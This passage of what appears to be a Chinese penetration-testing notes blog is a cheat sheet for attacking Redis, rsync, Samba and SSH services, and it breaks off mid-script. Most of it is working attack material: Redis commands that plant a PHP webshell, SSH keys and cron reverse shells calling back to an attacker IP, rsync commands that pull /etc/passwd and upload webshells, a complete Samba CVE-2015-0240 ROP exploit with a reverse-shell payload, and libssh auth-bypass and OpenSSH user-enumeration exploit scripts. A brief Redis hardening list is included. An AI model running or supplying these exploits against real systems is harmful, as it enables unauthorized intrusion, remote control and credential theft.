<li><code>cd ~/.ssh/</code></li>
<li><code>ssh-keygen -t rsa</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/29.png" alt></li>
<li><code>config get dir #检查当前保存路径</code></li>
<li><code>config get dbfilename #检查保存文件名</code></li>
<li><code>set test &quot;\n\n\n公钥\n\n\n&quot; #将公钥写入test键</code></li>
<li><code>config set dir /root/.ssh/ #设置保存路径</code></li>
<li><code>config set dbfilename authorized_keys #设置保存文件名</code></li>
<li><code>save</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/30.png" alt></li>
<li>利用公钥免密登录ssh</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/31.png" alt></li>
</ol>
<h3 id="主从redis"><a href="#主从redis" class="headerlink" title="主从redis"></a>主从redis</h3><ol>
<li><strong>主attackip：10.0.0.1，从redis_ip：10.0.0.2</strong></li>
<li><code>redis-cli -h 10.0.0.2 -p 6379</code> #通过主从关系建立连接</li>
<li><code>slaveof 10.0.0.1 6379</code> #Redis Slaveof 命令可以将当前服务器转变为指定服务器的从属服务器(slave server)</li>
<li><code>redis-cli -h 10.0.0.1 -p 6379</code> #然后就可以登录主redis控制从redis</li>
<li><code>set mykey hello</code></li>
<li><code>set mykey2 helloworld</code></li>
</ol>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>127.0.0.1:6379&gt;</strong></p>
<pre><code>info #返回各种信息
config get * #获取信息
config get dir
config get dbfilename
dbsize 

#写入shell
config get databases #一般16个数据库
select 16 #选第16个
set 1 &#39;&lt;?php eval($_POST[&#39;1&#39;]);?&gt;&#39;
config set dir /var/www/html
config set dbfilename shell.php
save

#写入公钥免密登录
ssh-keygen -t rsa #本地生成无密密钥
cat /root/.ssh/id_rsa.pub #查看密钥
set test &quot;\n\n\n公钥\n\n\n&quot; #写入内容
config set dir /root/.ssh/ #指定目录
config set dbfilename authorized_keys #写入到文件 
save
ssh -i id_rsa username@IP #本地私钥免密登录

ssh-keygen -t rsa
&lt;echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt;pub.txt
cat pub.txt | redis-cli -h redis_ip -x set test
redis-cli -h redis_ip 
config set dir /root/.ssh/
config set dbfilename &quot;authorized_keys&quot;
save
ssh –i  id_rsa root@redis_ip


#写入定时任务反弹shell
set 1 &#39;\n\n*/1 * * * * bash -i /dev/tcp/IP/port 0&gt;&amp;1\n\n&#39;
config set dir /var/spool/cron/
config set dbfilename root
save

#生成恶意so文件
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 
cd RedisModules-ExecuteCommand/ 
make

git clone https://github.com/LoRexxar/redis-rogue-server 
将.so文件复制到与redis-rogue-server.py相同的文件夹中
python3 redis-rogue-server.py --rhost IP --rport 6379 --lhost IP --lport 8888

#写入定时任务反弹shell
echo -e &quot;\n\n*/1 * * * * /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;attackip\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n\n&quot;|redis-cli -h redis_ip -x set 1
redis-cli -h redis_ip config set dir /var/spool/cron/
redis-cli -h redis_ip config set dbfilename root
redis-cli -h redis_ip save

#config被禁用
rename-command config &quot;&quot;

#/etc/crontab 与 /var/spool/cron/ 区别
系统级：/etc/crontab
用户级：/var/spool/cron/</code></pre><h3 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h3><ol>
<li>redis默认监听127.0.0.1</li>
<li>修改redis.conf，去掉#bind 127.0.0.1前的#，指定允许访问的IP</li>
<li><ul>
<li><code>bind 192.168.100.1 127.0.0.1</code> #保存，重启才能生效</li>
</ul>
</li>
<li>设置防火墙策略，仅允许指定IP来访问redis服务</li>
<li><ul>
<li><code>iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT</code></li>
</ul>
</li>
<li>设置密码验证，修改redis.conf，去掉#requirepass前的#，后面加上密码</li>
<li><ul>
<li><code>requirepass WUFer123ex894tr&gt;&lt;)(*&amp;^</code>   #保存，重启才能生效</li>
</ul>
</li>
<li>设置运行权限最小化</li>
<li><ul>
<li><code>useradd -M -s /sbin/nologin [username]</code> #重启才能生效</li>
</ul>
</li>
<li>隐藏或禁用重要命令 #重启才能生效</li>
<li><ul>
<li><code>rename-command CONFIG &quot;&quot;</code></li>
</ul>
</li>
<li><ul>
<li><code>rename-command flushall &quot;&quot;</code></li>
</ul>
</li>
<li><ul>
<li><code>rename-command flushdb &quot;&quot;</code></li>
</ul>
</li>
<li><ul>
<li><code>rename-command shutdown shotdown_test</code></li>
</ul>
</li>
<li>关注官网发布，及时更新程序或补丁</li>
</ol>
<h3 id="相关参考-1"><a href="#相关参考-1" class="headerlink" title="相关参考"></a>相关参考</h3><ol>
<li><a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">redis教程</a></li>
<li><a href="https://help.aliyun.com/knowledge_detail/37447.html" target="_blank" rel="noopener">redis安全加固</a></li>
</ol>
<hr>
<h2 id="rsync-未授权访问"><a href="#rsync-未授权访问" class="headerlink" title="rsync 未授权访问"></a><span id="rsync">rsync 未授权访问</span></h2><ol>
<li>rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。</li>
<li><strong>简单扫描：</strong></li>
<li><code>nc -vn IP 873</code></li>
<li><code>nmap -sV --script &quot;rsync-list-modules&quot; -p &lt;PORT&gt; &lt;IP&gt;</code></li>
<li><code>msf&gt; use auxiliary/scanner/rsync/modules_list</code></li>
<li><strong>利用：</strong></li>
<li><code>rsync ip::</code></li>
<li><code>rsync rsync://ip:873/</code></li>
<li><code>rsync ip::xxx/</code> #列目录</li>
<li><code>rsync rsync://ip:873/dir/</code> #假如存在dir目录，列目录</li>
<li><code>rsync -avz rsync://ip:873/dir/etc/passwd ./</code> #假如/dir/是Linux根目录，这里就是下载/etc/passwd</li>
<li><code>rsync -avz ip::xxx/config.ini /tmp</code>  #下载文件</li>
<li><code>rsync -avz shell rsync://ip:873/dir/etc/cron.d/shell</code> #写入计划任务</li>
<li><code>rsync -avz webshell.php ip::web/</code>  #上传webshell</li>
</ol>
<pre><code># -*- coding:utf-8 -*-
&quot;&quot;&quot;Rsync匿名访问漏洞（未授权访问漏洞）验证工具&quot;&quot;&quot;
#引入依赖的包和库文件
import os
import sys
import socket
import logging

#全局配置设置
logging.basicConfig(level=logging.INFO,format=&quot;%(message)s&quot;)
socket.setdefaulttimeout(3)

#全局变量
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#全局函数：
def str2Binary(content):
    &quot;&quot;&quot;将文本流转换成二进制流&quot;&quot;&quot;
    return content.replace(&#39; &#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;).decode(&#39;hex&#39;)

def rsyncCheck(ip,port):
    &quot;&quot;&quot;执行端口预检查&quot;&quot;&quot;
    global client
    try:
        client.connect((ip,port))
    except Exception,reason:
        logging.error(&quot;[-] 访问失败：%s&quot;%reason)
        return False
    helloString = &quot;405253594e43443a2033312e300a&quot;
    try:
        client.send(str2Binary(helloString))
        hellodata = client.recv(1024)
    except Exception,reason:
        logging.error(&quot;[-] 通信失败：%s&quot;%reason)
        return False
    if hellodata.find(&quot;@RSYNCD&quot;) &gt;= 0:
        try:
            client.send(str2Binary(&quot;0a&quot;))
        except Exception,reason:
            logging.error(&quot;[-] 访问失败：%s&quot;%reason)
            return False
        while True:
            try:
                data = client.recv(1024)
            except Exception,reason:
                logging.error(&quot;[-] 通信失败：%s&quot;%reason)
            if data == &quot;&quot;:
                break
            else:
                if str(data).find(&quot;@RSYNCD: EXIT&quot;) &gt;= 0:
                    logging.info(&quot;[*] 发现漏洞！&quot;)
                    return True
    return False

if __name__ == &quot;__main__&quot;:
    ip = sys.argv[1]
    try:
        port = sys.argv[2]
    except Exception,reason:
        port = 873
        logging.error(&quot;[-] 端口未输入，按照873默认端口进行&quot;)
    try:
        port = int(port)
    except Exception,reason:
        logging.error(&quot;[-] 端口输入错误，按照873默认端口进行&quot;)
        port = 873
    if not rsyncCheck(ip,port):
        logging.info(&quot;[+] 测试安全！&quot;)</code></pre><hr>
<h2 id="Samba-远程代码执行漏洞（CVE-2015-0240）"><a href="#Samba-远程代码执行漏洞（CVE-2015-0240）" class="headerlink" title="Samba 远程代码执行漏洞（CVE-2015-0240）"></a><span id="CVE-2015-0240">Samba 远程代码执行漏洞（CVE-2015-0240）</span></h2><ol>
<li>端口：445</li>
<li>Samba 3.5.x 全版本</li>
<li>Samba 3.6.x 到 Samba 3.6.25 之前的版本</li>
<li>Samba 4.0.x 到 Samba 4.0.25 之前的版本</li>
<li>Samba 4.1.x 到 Samba 4.1.17 之前的版本</li>
<li>Samba 4.2.x 到 Samba 4.2.0rc5 之前的版本</li>
</ol>
<pre><code>#!/usr/bin/env python2
# sudo apt-get install samba=2:3.6.3-2ubuntu2 samba-common=2:3.6.3-2ubuntu2 libwbclient0=2:3.6.3-2ubuntu2
import sys
import signal
import time

# https://github.com/zTrix/zio
from zio import *
from multiprocessing import Pool, Manager
import impacket
from impacket.dcerpc.v5 import transport, nrpc
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import *

host = &#39;127.0.0.1&#39;
port = 445
cmd = &quot;bash -c &#39;bash &gt;/dev/tcp/127.0.0.1/1337 0&lt;&amp;1 &#39;\0&quot;
# 0x0041e2cb: pop eax ; pop esi ; pop edi ; pop ebp ; ret ;
pop4ret_o = 0x41e2cb
# 0x000a6d7c: lea esp, dword [ecx-0x04] ; ret ;
popebx_o = 0x006fd522
pivot_o = 0xa6d7c
got_o = 0x9cd640
fmt_o = 0x8e043e
system_o = 0xa4250 
snprintf_o = 0xa3e20
bss_o = 0x9d5dc0
pie = 0x80000000
free_addr = 0x809fa10c + 8 + 32

def exploit(free_addr, pie=0, destructor=-1, step=0x80):
    pivot = pie + pivot_o
    pop4ret = pie + pop4ret_o
    popebx = pie + popebx_o
    got = pie + got_o
    fmt = pie + fmt_o
    system = pie + system_o
    snprintf = pie + snprintf_o
    bss = pie + bss_o

    if pie != 0:
        destructor = pivot
    # struct talloc_chunk {
    #     struct talloc_chunk *next, *prev;
    #     struct talloc_chunk *parent, *child;
    #     struct talloc_reference_handle *refs; // refs = 0
    #     talloc_destructor_t destructor; // destructor = -1: (No Crash), others: controled EIP
    #     const char *name;
    #     size_t size;
    #     unsigned flags; // magic
    #     void *poo
    # };
    talloc_chunk = l32(0)           # refs =&gt; 0
    talloc_chunk += l32(destructor) # destructor =&gt; control EIP
    talloc_chunk += l32(pop4ret)    # pop4ret
    talloc_chunk += &#39;leet&#39;          #
    talloc_chunk += l32(0xe8150c70) # flags =&gt; magic

    # ebx =&gt; got
    rop = l32(popebx) + l32(got)
    # write cmd to bss
    for i in xrange(len(cmd)):
        c = cmd[i]
        rop += l32(snprintf) + l32(pop4ret)
        rop += l32(bss + i) + l32(2) + l32(fmt) + l32(ord(c))
    # system(cmd)
    rop += l32(system) + &#39;leet&#39; + l32(bss)

    payload = &#39;deadbeef&#39;
    payload += talloc_chunk * 0x1000 * step
    payload += &#39;leet&#39; * 2
    payload += rop.ljust(2560, &#39;C&#39;)
    payload += &#39;cafebabe&#39; + &#39;\0&#39;

    username = &#39;&#39;
    password = &#39;&#39;

    ###
    # impacket does not implement NetrServerPasswordSet
    ###
    # 3.5.4.4.6 NetrServerPasswordSet (Opnum 6)
    class NetrServerPasswordSet(NDRCALL):
        opnum = 6
        structure = (
           (&#39;PrimaryName&#39;,nrpc.PLOGONSRV_HANDLE),
           (&#39;AccountName&#39;,WSTR),
           (&#39;SecureChannelType&#39;,nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
           (&#39;ComputerName&#39;,WSTR),
           (&#39;Authenticator&#39;,nrpc.NETLOGON_AUTHENTICATOR),
           (&#39;UasNewPassword&#39;,nrpc.ENCRYPTED_NT_OWF_PASSWORD),
        )

    class NetrServerPasswordSetResponse(NDRCALL):
        structure = (
           (&#39;ReturnAuthenticator&#39;,nrpc.NETLOGON_AUTHENTICATOR),
           (&#39;ErrorCode&#39;,NTSTATUS),
        )

    nrpc.OPNUMS[6] = (NetrServerPasswordSet, NetrServerPasswordSetResponse)

    ###
    # connect to target
    ###
    rpctransport = transport.DCERPCTransportFactory(r&#39;ncacn_np:%s[\PIPE\netlogon]&#39; % host)
    rpctransport.set_credentials(&#39;&#39;,&#39;&#39;)  # NULL session
    rpctransport.set_dport(port)
    # impacket has a problem with SMB2 dialect against samba4
    # force to &#39;NT LM 0.12&#39; only
    rpctransport.preferred_dialect(&#39;NT LM 0.12&#39;)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)

    sessionKey = &#39;\x00&#39; * 16

    ###
    # prepare ServerPasswordSet request
    ###
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator[&#39;Credential&#39;] = nrpc.ComputeNetlogonCredential(&#39;12345678&#39;, sessionKey)
    authenticator[&#39;Timestamp&#39;] = 10

    uasNewPass = nrpc.ENCRYPTED_NT_OWF_PASSWORD()
    uasNewPass[&#39;Data&#39;] = payload

    primaryName = nrpc.PLOGONSRV_HANDLE()
    # ReferentID field of PrimaryName controls the uninitialized value of creds in ubuntu 12.04 32bit
    primaryName.fields[&#39;ReferentID&#39;] = free_addr

    request = NetrServerPasswordSet()
    request[&#39;PrimaryName&#39;] = primaryName
    request[&#39;AccountName&#39;] = username + &#39;\x00&#39;
    request[&#39;SecureChannelType&#39;] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel
    request[&#39;ComputerName&#39;] = host + &#39;\x00&#39;
    request[&#39;Authenticator&#39;] = authenticator
    request[&#39;UasNewPassword&#39;] = uasNewPass

    DCERPCSessionError = nrpc.DCERPCSessionError
    try:
        resp = dce.request(request)
        print(&quot;no error !!! error code: 0xc0000225 or 0xc0000034 is expected&quot;)
        print(&quot;seems not vulnerable&quot;)
        # resp.dump()
        dce.disconnect()
        return 2
    except DCERPCSessionError as e:
        # expect error_code: 0xc0000225 - STATUS_NOT_FOUND
        # expect error_code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND
        print(&quot;seems not vulnerable&quot;)
        # resp.dump()
        dce.disconnect()
        return 2
    except impacket.nmb.NetBIOSError as e:
        # print &#39;exception occured&#39;
        if e.args[0] == &#39;Error while reading from remote&#39;:
            # print(&quot;connection lost!!!\nmight be vulnerable&quot;)
            return 1
        else:
            raise
    except AttributeError:
        # print(&quot;exception&quot;)
        return 0

def init_worker():
    signal.signal(signal.SIGINT, signal.SIG_IGN)

def guess_heap(free_addr, step, hits):
    if len(hits) &gt; 0: return
    log(&quot;[+] trying heap addr %s&quot; % hex(free_addr), &#39;green&#39;)
    res = exploit(free_addr, destructor=-1, step=step)
    if res == 0:
        res = exploit(free_addr, destructor=0, step=step)
        if res != 0:
            log(&quot;hit: %s&quot; % hex(free_addr), &#39;red&#39;)
            hits.append(free_addr)

def guess_pie(free_addr, pie, step):
    log(&quot;[+] trying pie base addr %s&quot; % hex(pie), &#39;green&#39;)
    try:
        exploit(free_addr, pie=pie, step=step)
    except impacket.nmb.NetBIOSTimeout:
        pass

def brute_force_heap(step):
    hit = False
    print &quot;Initializng 10 processes for brute forcing heap address...&quot;
    pool = Pool(10, init_worker)
    manager = Manager()
    hits = manager.list()
    for free_addr_base in range(0xb7700000, 0xba000000, 0x1000 * step * 20):
        for offset in xrange(5):
            pool.apply_async(guess_heap, (free_addr_base + offset * 4, step, hits))

    try:
        while True:
            time.sleep(5)
            if len(hits) &gt; 0:
                pool.terminate()
                pool.join()
                return hits[0]

    except KeyboardInterrupt:
        print &quot;Caught KeyboardInterrupt, terminating...&quot;
        pool.terminate()
        pool.join()
        sys.exit(0)

def brute_force_pie(free_addr, step):
    print &quot;Initializng 10 processes for brute forcing PIE base address...&quot;
    pool = Pool(10, init_worker)
    for pie in range(0xb6d00000, 0xb6f00000, 0x1000):
        pool.apply_async(guess_pie, (free_addr, pie, step))

    try:
        time.sleep(60 * 60)

    except KeyboardInterrupt:
        print &quot;Caught KeyboardInterrupt, terminating...&quot;
        pool.terminate()
        pool.join()

    else:
        pool.close()
        pool.join()

step = 0x1
free_addr = brute_force_heap(step)
brute_force_pie(free_addr, step)</code></pre><hr>
<h2 id="Samba-远程命令执行漏洞（CVE-2017-7494）"><a href="#Samba-远程命令执行漏洞（CVE-2017-7494）" class="headerlink" title="Samba 远程命令执行漏洞（CVE-2017-7494）"></a><span id="CVE-2017-7494">Samba 远程命令执行漏洞（CVE-2017-7494）</span></h2><ol>
<li>端口：445</li>
<li>Samba 3.5.0到4.6.4/4.5.10/4.4.14的中间版本</li>
<li>Samba允许连接一个远程的命名管道，并且在连接前会调用is_known_pipename()函数验证管道名称是否合法。在is_known_pipename()函数中，并没有检查管道名称中的特殊字符，加载了使用该名称的动态链接库。导致攻击者可以构造一个恶意的动态链接库文件，执行任意代码。</li>
<li>该漏洞要求的利用条件：</li>
<li><ul>
<li>拥有共享文件写入权限，如：匿名可写等</li>
</ul>
</li>
<li><ul>
<li>需要知道共享目录的物理路径</li>
</ul>
</li>
<li>Linux安装smbclient：apt install smbclient</li>
<li>smbclient //IP/myshare -N #连接</li>
<li>exploit/linux/samba/is_known_pipename #MSF下的利用模块</li>
</ol>
<hr>
<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><strong>扫描发现</strong></p>
<pre><code>nc -vn IP 22
msf&gt;use scanner/ssh/ssh_enumusers</code></pre><p><strong>服务器的公共SSH密钥</strong><br><code>ssh-keyscan -t rsa IP -p port</code></p>
<p><strong>爆破</strong></p>
<pre><code>msf&gt;use scanner/ssh/ssh_identify_pubkeys</code></pre><p><strong>常见SSH文件</strong></p>
<pre><code>ssh_config #针对客户端的配置文件
sshd_config #针对服务端的配置文件
authorized_keys #用户的公钥
ssh_known_hosts #保存一些对所有用户都可信赖的远程主机的公钥
known_hosts #首次登录时，接受远程主机的公钥后就会得到host主机的认可
id_rsa #私钥</code></pre><p><a href="http://localhost:4000/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">本地博客：SSH转发</a><br><a href="https://10fteam.github.io/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">互联网博客：SSH转发</a></p>
<p><strong>SSH用户枚举</strong></p>
<ol>
<li>paramiko版本有要求，在paramiko的高版本中，移除了<strong>getitem</strong>，导致报错。<a href="https://anquan.baidu.com/article/845" target="_blank" rel="noopener">https://anquan.baidu.com/article/845</a></li>
<li><code>pip uninstall paramiko</code> #卸载高版本的paramiko</li>
<li><code>pip install paramiko==1.18.3</code> #安装指定版本的paramiko</li>
<li></li>
</ol>
<hr>
<h2 id="SSH-libssh认证绕过CVE-2018-10933"><a href="#SSH-libssh认证绕过CVE-2018-10933" class="headerlink" title="SSH libssh认证绕过CVE-2018-10933"></a><span id="CVE-2018-10933">SSH libssh认证绕过CVE-2018-10933</span></h2><p>描述：</p>
<ul>
<li>libssh 0.6 及以上的版本，在服务端的代码实现中存在身份认证绕过漏洞。在向服务端认证的流程中，攻击者通过将 SSH2_MSG_USERAUTH_REQUEST 消息替换为 SSH2_MSG_USERAUTH_SUCCESS，即可在无需任何有效凭证的情况下认证成。</li>
</ul>
<p>版本：</p>
<ul>
<li>libssh 0.8.x - 0.8.3</li>
<li>libssh 0.7.x - 0.7.5</li>
<li>libssh 0.6.x</li>
</ul>
<p>常见端口：</p>
<ul>
<li>2222</li>
<li>22</li>
</ul>
<pre><code>#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging
# pip3 install paramiko==2.0.8

#logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
logging.basicConfig(stream=sys.stdout)
bufsize = 2048

def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # stdin = client.makefile(&quot;wb&quot;, bufsize)
        stdout = client.makefile(&quot;rb&quot;, bufsize)
        stderr = client.makefile_stderr(&quot;rb&quot;, bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug(&quot;TCPForwarding disabled on remote server can&#39;t connect. Not Vulnerable&quot;)
    except socket.error:
        logging.debug(&quot;Unable to connect.&quot;)

    return None

if __name__ == &#39;__main__&#39;:
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))</code></pre><pre><code>#!/usr/bin/env python3
import paramiko
import socket
import argparse
from sys import argv, exit

parser = argparse.ArgumentParser(description=&quot;libSSH Authentication Bypass&quot;)
parser.add_argument(&#39;--host&#39;, help=&#39;Host&#39;)
parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help=&#39;libSSH port&#39;, default=22)
parser.add_argument(&#39;-log&#39;, &#39;--logfile&#39;, help=&#39;Logfile to write conn logs&#39;, default=&quot;paramiko.log&quot;)

args = parser.parse_args()

def BypasslibSSHwithoutcredentials(hostname, port):

    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        spawncmd = transport.open_session()
        spawncmd.invoke_shell()
        return 0

    except paramiko.SSHException as e:
        print(&quot;TCPForwarding disabled on remote/local server can&#39;t connect. Not Vulnerable&quot;)
        return 1
    except socket.error:
        print(&quot;Unable to connect.&quot;)
        return 1

def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        hostname = args.host
        port = args.port
    except:
        parser.print_help()
        exit(1)
    BypasslibSSHwithoutcredentials(hostname, port)

if __name__ == &#39;__main__&#39;:
    exit(main())</code></pre><hr>
<h2 id="SSH-用户名枚举漏洞（CVE-2018-15473）"><a href="#SSH-用户名枚举漏洞（CVE-2018-15473）" class="headerlink" title="SSH 用户名枚举漏洞（CVE-2018-15473）"></a><span id="CVE-2018-15473">SSH 用户名枚举漏洞（CVE-2018-15473）</span></h2><p>描述：</p>
<ul>
<li>存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。</li>
</ul>
<p>版本：</p>
<ul>
<li>OpenSSH &lt;=7.7</li>
</ul>
<ol>
<li><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></li>
<li><code>python3 sshUsernameEnumExploit.py --port 22 --userList exampleInput.txt IP</code></li>
<li><code>不同版本的paramiko：_handler_table更改为_client_handler_table</code></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/ssh_enum.png" alt></li>
</ol>
<pre><code>#!/usr/bin/env python
###########################################################################
#                ____                    _____ _____ _    _               #
#               / __ \                  / ____/ ____| |  | |              #
#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #
#              | |  | | &#39;_ \ / _ \ &#39;_ \ \___ \\___ \|  __  |              #
#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #
#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #
#                     | |               Username Enumeration              #
#                     |_|                                                 #
#                                                                         #
###########################################################################
# Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #
# Vulnerability: CVE-2018-15473                                           #
# Affected Versions: OpenSSH version &lt; 7.7                                #
# Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #
# Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #
# Email: Justin.Gardner@SynerComm.com                                     #
# Date: August 20, 2018                                                   #
###########################################################################

import argparse
import logging
import paramiko
import multiprocessing
import socket
import string
import sys
import json
from random import randint as rand
from random import choice as choice
# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
random_username_list = []
# populate the list
for i in range(3):
    user = &quot;&quot;.join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
    random_username_list.append(user)

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious &quot;add_boolean&quot; function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# create function to perform authentication with malformed packet and desired username
def checkUsername(username, tried=0):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried &lt; 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print(&#39;[-] Failed to negotiate SSH transport&#39;)
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
            return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
    #Successful auth(?)
    raise Exception(&quot;There was an error. Is this the correct version of OpenSSH?&quot;)

# function to test target system using the randomly generated usernames
def checkVulnerable():
    vulnerable = True
    for user in random_username_list:
        result = checkUsername(user)
        if result[1]:
            vulnerable = False
    return vulnerable

def exportJSON(results):
    data = {&quot;Valid&quot;:[], &quot;Invalid&quot;:[]}
    for result in results:
        if result[1] and result[0] not in data[&#39;Valid&#39;]:
            data[&#39;Valid&#39;].append(result[0])
        elif not result[1] and result[0] not in data[&#39;Invalid&#39;]:
            data[&#39;Invalid&#39;].append(result[0])
    return json.dumps(data)

def exportCSV(results):
    final = &quot;Username, Valid\n&quot;
    for result in results:
        final += result[0]+&quot;, &quot;+str(result[1])+&quot;\n&quot;
    return final

def exportList(results):
    final = &quot;&quot;
    for result in results:
        if result[1]:
            final+=result[0]+&quot; is a valid user!\n&quot;
        else:
            final+=result[0]+&quot; is not a valid user!\n&quot;
    return final

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument(&#39;hostname&#39;, type=str, help=&quot;The target hostname or ip address&quot;)
arg_parser.add_argument(&#39;--port&#39;, type=int, default=22, help=&quot;The target port&quot;)
arg_parser.add_argument(&#39;--threads&#39;, type=int, default=5, help=&quot;The number of threads to be used&quot;)
arg_parser.add_argument(&#39;--outputFile&#39;, type=str, help=&quot;The output file location&quot;)
arg_parser.add_argument(&#39;--outputFormat&#39;, choices=[&#39;list&#39;, &#39;json&#39;, &#39;csv&#39;], default=&#39;list&#39;, type=str, help=&quot;The output file location&quot;)
group = arg_parser.add_mutually_exclusive_group(required=True)
group.add_argument(&#39;--username&#39;, type=str, help=&quot;The single username to validate&quot;)
group.add_argument(&#39;--userList&#39;, type=str, help=&quot;The list of usernames (one per line) to enumerate through&quot;)
args = arg_parser.parse_args()

def main():
    sock = socket.socket()
    try:
        sock.connect((args.hostname, args.port))
        sock.close()
    except socket.error:
        print(&#39;[-] Connecting to host failed. Please check the specified host and port.&#39;)
        sys.exit(1)

    # first we run the function to check if host is vulnerable to this CVE
    if not checkVulnerable():
        # most probably the target host is either patched or running a version not affected by this CVE
        print(&quot;Target host most probably is not vulnerable or already patched, exiting...&quot;)
        sys.exit(0)
    elif args.username: #single username passed in
        result = checkUsername(args.username)
        if result[1]:
            print(result[0]+&quot; is a valid user!&quot;)
        else:
            print(result[0]+&quot; is not a valid user!&quot;)
    elif args.userList: #username list passed in
        try:
            f = open(args.userList)
        except IOError:
            print(&quot;[-] File doesn&#39;t exist or is unreadable.&quot;)
            sys.exit(3)
        usernames = map(str.strip, f.readlines())
        f.close()
        # map usernames to their respective threads
        pool = multiprocessing.Pool(args.threads)
        results = pool.map(checkUsername, usernames)
        try:
            if args.outputFile:
                outputFile = open(args.outputFile, &quot;w&quot;)
        except IOError:
            print(&quot;[-] Cannot write to outputFile.&quot;)
            sys.exit(5)
        if args.outputFormat==&#39;json&#39;:
            if args.outputFile:
                outputFile.writelines(exportJSON(results))
                outputFile.close()
                print(&quot;[+] Results successfully written to &quot; + args.outputFile + &quot; in JSON form.&quot;)
            else:
                print(exportJSON(results))
        elif args.outputFormat==&#39;csv&#39;:
            if args.outputFile:
